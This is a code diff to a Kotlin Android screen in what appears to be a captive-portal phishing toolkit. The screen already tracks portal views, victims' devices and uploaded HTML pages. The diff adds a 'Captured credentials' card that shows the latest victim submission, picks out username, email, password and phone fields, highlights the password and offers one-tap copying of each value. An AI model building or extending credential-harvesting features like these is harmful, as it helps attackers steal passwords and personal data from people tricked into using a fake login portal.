@@ -57,6 +57,7 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
+import com.swp81x.nrsuite.core.credentials.CapturedCredential
 import com.swp81x.nrsuite.ui.components.HtmlUploadSection
 import com.swp81x.nrsuite.ui.components.StatusIndicator
 import com.swp81x.nrsuite.ui.theme.NrAccent
@@ -80,6 +81,7 @@ fun PortalScreen(
     portalViews: Int,
     portalClients: Int,
     capturedData: Int,
+    credentials: List<CapturedCredential>,
     selectedHtmlName: String?,
     htmlUploading: Boolean,
     htmlProgress: Int,
@@ -166,6 +168,11 @@ fun PortalScreen(
                     portalClients = portalClients,
                     capturedData = capturedData,
                 )
+
+                if (credentials.isNotEmpty()) {
+                    Spacer(Modifier.height(10.dp))
+                    CapturedCredentialsZone(credentials)
+                }
                 }
             } else {
                 Card(
@@ -423,6 +430,110 @@ private fun NumberStepper(
             )
         }
     }
+}
+
+@Composable
+private fun CapturedCredentialsZone(credentials: List<CapturedCredential>) {
+    val clipboard = LocalClipboardManager.current
+    val latest = credentials.lastOrNull() ?: return
+    val shownFields = latest.knownPortalFields()
+
+    Card(
+        modifier = Modifier.fillMaxWidth(),
+        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
+        border = BorderStroke(0.5.dp, NrOutline),
+        shape = RoundedCornerShape(12.dp),
+    ) {
+        Column(Modifier.padding(14.dp)) {
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Icon(
+                    imageVector = Icons.Default.Lock,
+                    contentDescription = null,
+                    tint = NrAccent,
+                    modifier = Modifier.size(20.dp),
+                )
+                Spacer(Modifier.width(8.dp))
+                Text(
+                    text = "Captured credentials (${credentials.size})",
+                    style = MaterialTheme.typography.titleMedium,
+                    fontWeight = FontWeight.SemiBold,
+                )
+            }
+            Spacer(Modifier.height(6.dp))
+            Text(
+                text = "Latest submission: ${latest.capturedAt}  ·  ${latest.details.size} field(s)",
+                style = MaterialTheme.typography.bodySmall.copy(fontFamily = FontFamily.Monospace),
+                color = NrOnSurfaceVariant,
+            )
+
+            Spacer(Modifier.height(6.dp))
+            shownFields.forEach { (label, value) ->
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                ) {
+                    Text(
+                        text = "$label:",
+                        style = MaterialTheme.typography.bodySmall,
+                        color = NrOnSurfaceVariant,
+                        modifier = Modifier.width(78.dp),
+                    )
+                    Text(
+                        text = value,
+                        style = MaterialTheme.typography.bodyMedium.copy(fontFamily = FontFamily.Monospace),
+                        color = if (label == "Password") StatusGreen else MaterialTheme.colorScheme.onSurface,
+                        modifier = Modifier.weight(1f),
+                    )
+                    IconButton(onClick = { clipboard.setText(AnnotatedString(value)) }) {
+                        Icon(
+                            imageVector = Icons.Default.ContentCopy,
+                            contentDescription = "Copy $label",
+                            tint = NrOnSurfaceVariant,
+                        )
+                    }
+                }
+            }
+
+            val extraFields = (latest.details.size - shownFields.size).coerceAtLeast(0)
+            if (extraFields > 0) {
+                Text(
+                    text = "+$extraFields more field(s) in Credential Manager · Portal filter.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = NrOnSurfaceVariant,
+                )
+            } else {
+                Text(
+                    text = "Full submissions are available in Credential Manager · Portal filter.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = NrOnSurfaceVariant,
+                )
+            }
+        }
+    }
+}
+
+private fun CapturedCredential.knownPortalFields(): List<Pair<String, String>> {
+    val known = listOf(
+        "Username" to listOf("username", "user", "login"),
+        "Email" to listOf("email", "mail"),
+        "Password" to listOf("password", "pass"),
+        "Phone" to listOf("phone", "mobile"),
+    )
+    val fields = linkedMapOf<String, String>()
+    known.forEach { (label, keys) ->
+        keys.forEach { key ->
+            val value = details.entries.firstOrNull { it.key.equals(key, ignoreCase = true) }?.value
+            if (!value.isNullOrBlank()) {
+                fields.putIfAbsent(label, value)
+                return@forEach
+            }
+        }
+    }
+
+    if (fields.isEmpty()) {
+        fields["Value"] = value
+    }
+    return fields.entries.map { it.key to it.value }
 }
 
 @Composable
